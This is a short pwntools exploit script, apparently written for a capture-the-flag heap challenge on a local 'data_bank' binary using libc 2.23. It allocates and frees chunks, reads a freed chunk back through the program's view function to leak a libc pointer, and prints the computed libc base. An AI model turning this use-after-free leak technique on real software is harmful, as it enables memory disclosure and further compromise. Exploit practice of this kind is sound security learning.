from pwn import *

p = process("./data_bank",  env = {"LD_PRELOAD": "./libc6-amd64_2.23.so"})

def add(index, size, data):
    p.send("1")
    p.recv()
    p.send(str(index))
    p.recv()
    p.send(str(size))
    p.recv()
    p.send(data)
    p.recv()

def delete(index):
    p.send("3")
    p.recv()
    p.send(str(index))
    print("Delete "+str(index) +": " + p.recvuntil("\n").decode("utf-8"))
    p.recv()

def view(index):
    p.send("4")
    p.recv()
    p.send(str(index))
    result = p.recvuntil("\n")[11:-1]
    p.recv()
    return result

#gdb.attach(p,gdbscript = '''
#set environment LD_PRELOAD ./libc6-amd64_2.23.so
#init-gef
#b main
#b add
#b delete
#''')
p.recv().decode("utf-8")
add(0, 400, "test")
add(1, 500, "test")
delete(0)
leak = u64(view(0).ljust(8,b"\x00"))
print("LIBC base address: " + hex(leak - leak % 0x1000))
p.interactive()
